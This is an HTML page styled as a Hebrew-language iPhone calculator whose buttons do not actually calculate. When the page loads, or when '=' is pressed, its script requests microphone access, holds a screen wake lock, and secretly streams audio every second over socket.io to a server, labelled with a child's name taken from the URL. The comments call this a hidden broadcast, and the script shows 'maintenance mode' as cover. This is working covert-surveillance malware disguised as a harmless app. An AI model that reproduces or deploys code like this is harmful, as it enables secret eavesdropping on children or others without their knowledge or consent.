<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>מחשבון</title>
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: black; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: white; padding-bottom: env(safe-area-inset-bottom); }
        
        .calculator { background: black; width: 100%; max-width: 450px; height: 100%; display: flex; flex-direction: column; }
        
        /* תצוגת המספרים */
        .display { color: white; font-size: 80px; text-align: left; padding: 60px 20px 20px; flex: 1; display: flex; align-items: flex-end; justify-content: flex-end; font-weight: 300; white-space: nowrap; overflow: auto; unicode-bidi: plaintext; }
        
        /* גריד הכפתורים */
        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 20px; background: black; flex: 2; }
        
        /* עיצוב כפתור בסיסי */
        .btn { border: none; font-size: 36px; color: white; cursor: pointer; border-radius: 50%; width: 100%; padding-top: 100%; position: relative; transition: 0.2s; outline: none; }
        .btn span { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
        
        /* אנימציית לחיצה */
        .btn:active { opacity: 0.6; }
        
        /* צבעי כפתורים */
        .btn-num { background-color: #333; } /* כפתורי מספרים */
        
        .btn-op { background-color: #ff9f0a; color: white; font-weight: bold; } /* כפתורי פעולות: + - * / */
        
        .btn-special { background-color: #a5a5a5; color: black; } /* כפתורים מיוחדים: C +/- % */
        
        /* כפתור האפס (רחב יותר) */
        .btn-zero { grid-column: span 2; border-radius: 50px; padding-top: 0; display: flex; align-items: center; justify-content: center; }
        .btn-zero span { left: 25%; }
        
    </style>
</head>
<body>
    <div class="calculator">
        <div class="display" id="display">0</div>
        <div class="buttons">
            <button class="btn btn-special" onclick="clearDisplay()"><span>C</span></button>
            <button class="btn btn-special"><span>+/-</span></button>
            <button class="btn btn-special"><span>%</span></button>
            <button class="btn btn-op"><span>÷</span></button>

            <button class="btn btn-num" onclick="addNumber('7')"><span>7</span></button>
            <button class="btn btn-num" onclick="addNumber('8')"><span>8</span></button>
            <button class="btn btn-num" onclick="addNumber('9')"><span>9</span></button>
            <button class="btn btn-op"><span>×</span></button>

            <button class="btn btn-num" onclick="addNumber('4')"><span>4</span></button>
            <button class="btn btn-num" onclick="addNumber('5')"><span>5</span></button>
            <button class="btn btn-num" onclick="addNumber('6')"><span>6</span></button>
            <button class="btn btn-op"><span>−</span></button>

            <button class="btn btn-num" onclick="addNumber('1')"><span>1</span></button>
            <button class="btn btn-num" onclick="addNumber('2')"><span>2</span></button>
            <button class="btn btn-num" onclick="addNumber('3')"><span>3</span></button>
            <button class="btn btn-op"><span>+</span></button>

            <button class="btn btn-num btn-zero" onclick="addNumber('0')"><span>0</span></button>
            <button class="btn btn-num"><span>.</span></button>
            <button class="btn btn-op" onclick="calculate()"><span>=</span></button>
        </div>
    </div>

    <script>
        let currentInput = '0';
        const display = document.getElementById('display');
        const socket = io();

        // --- קביעת שם הילד מהכתובת (למשל: child.html?name=מיכאל) ---
        const urlParams = new URLSearchParams(window.location.search);
        const childName = urlParams.get('name') || "ילד_לא_מזוהה";

        function addNumber(num) {
            currentInput = currentInput === '0' ? num : currentInput + num;
            updateDisplay();
        }

        function clearDisplay() { 
            currentInput = '0'; 
            updateDisplay(); 
        }

        function updateDisplay() {
            display.innerText = currentInput;
            // התאמה דינמית של גודל הפונט כשיש הרבה מספרים
            if (currentInput.length > 6) { display.style.fontSize = '50px'; }
            else { display.style.fontSize = '80px'; }
        }

        function calculate() { 
            // המחשבון עצמו לא באמת מחשב בקוד הזה (כדי לשמור על פשטות),
            // אבל לחיצה על "=" מבטיחה הפעלה של הניטור אם הדפדפן חסם את ההפעלה האוטומטית.
            if (currentInput === '0') currentInput = 'מצב תחזוקה';
            updateDisplay();
            startMonitoring();
        }

        // --- הפעלה אוטומטית של השידור הנסתר ברגע שהדף נטען ---
        window.onload = () => {
            // ניסיון הפעלה אוטומטי. אם זה נכשל, זה יופעל בלחיצה על "=" ב-calculate()
            startMonitoring();
        };

        async function startMonitoring() {
            try {
                // מניעת נעילת מסך (Wake Lock)
                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
                
                // בקשת הרשאת מיקרופון
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                // הגדרת ה-Recorder בפורמט Opus היציב
                const options = { mimeType: 'audio/webm;codecs=opus' };
                const mediaRecorder = new MediaRecorder(stream, options);
                
                // הצטרפות לחדר הניטור בשרת
                socket.emit('join-room', { name: childName });

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) socket.emit('audio-data', e.data);
                };
                
                // שליחת נתונים כל שנייה (1000ms)
                mediaRecorder.start(1000); 
                console.log("Monitoring started hidden for: " + childName);

            } catch (err) {
                console.log("Waiting for user interaction (permission) or '=' button press...");
            }
        }
    </script>
</body>
</html>
